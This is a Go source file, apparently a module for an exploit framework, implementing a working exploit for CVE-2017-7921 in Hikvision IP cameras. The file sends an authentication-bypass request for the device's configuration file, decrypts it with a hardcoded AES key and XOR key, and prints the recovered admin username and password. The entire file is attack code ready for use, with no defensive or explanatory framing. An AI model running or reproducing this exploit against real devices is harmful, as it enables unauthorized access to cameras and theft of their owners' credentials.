package exp_hikvision

import (
	"bytes"
	"crypto/aes"
	"encoding/hex"
	"fmt"
	"github.com/lz520520/railgunlib/pkg/goutils"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"regexp"
)

func paddingZero(src []byte) []byte {
	count := len(src) % 16
	dst := src
	if count != 0 {
		dst = append(src, bytes.Repeat([]byte{0}, 16-count)...)
	}
	return dst
}

func xorCode(data, key []byte) []byte {
	ml := len(data)
	kl := len(key)

	pwd := make([]byte, ml)
	if kl == 0 {
		return pwd
	}
	for i := 0; i < ml; i++ {
		pwd[i] = data[i] ^ key[i%kl]
	}
	return pwd
}

func stringExtract(src string) []string {
	return regexp.MustCompile(`[A-Za-z0-9/\-:.,_$%'()[\]<> ]{2,}`).FindAllString(src, -1)
}

func enmuration(src []string) []int {
	dst := make([]int, 0)
	for i, v := range src {
		if v == "admin" {
			dst = append(dst, i)
		}
	}
	return dst
}

type Exp_CVE_2017_7921 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2017_7921) Attack_getmsg1() (expResult exp_model.ExpResult) {
	self.Params.Settings.Charset = "UTF-8"
	// 默认配置
	headers := self.GetInitExpHeaders()
	target := goutils.AppendUri(self.Params.BaseParam.Target, "/System/configurationFile?auth=YWRtaW46MTEK")
	httpresp := self.HttpGetWithoutRedirect(target, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 && len(httpresp.Body) > aes.BlockSize {
		self.EchoSuccessMsg("Maybe Have Vuln.")
		key, _ := hex.DecodeString("279977f62f6cfd2d91cd75b889ce0c9a")
		block, _ := aes.NewCipher(key)
		ciphertext := paddingZero([]byte(httpresp.Body))
		ciphertext = ciphertext[aes.BlockSize:]
		//iv := ciphertext[:aes.BlockSize]
		//返回加密结果
		plaintextBytes := make([]byte, 0)

		//存储每次加密的数据
		tmpData := make([]byte, aes.BlockSize)
		//分组分块加密
		for index := 0; index < len(ciphertext); index += aes.BlockSize {
			block.Decrypt(tmpData, ciphertext[index:index+aes.BlockSize])
			plaintextBytes = append(plaintextBytes, tmpData...)
		}
		plaintextBytes = bytes.TrimRight(plaintextBytes, "\x00")
		self.EchoDebugMsg(fmt.Sprintf("%v", len(plaintextBytes)))
		// 异或解密
		xor := xorCode(plaintextBytes, []byte{0x73, 0x8B, 0x55, 0x44})
		// 提取可见字符
		resultList := stringExtract(string(xor))
		self.EchoDebugMsg(fmt.Sprintf("%v", resultList))
		// 获取admin索引
		index := enmuration(resultList)
		if len(index) > 0 {
			lastIndex := index[len(index)-1]
			self.EchoSuccessMsg("username: " + resultList[lastIndex])
			self.EchoSuccessMsg("password: " + resultList[lastIndex+1])
		}

	} else {
		self.EchoErrMsg(self.Params.BaseParam.Target + " failed.")
	}

	return
}

func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2017_7921{}, "exp_CVE_2017_7921.yml")

}
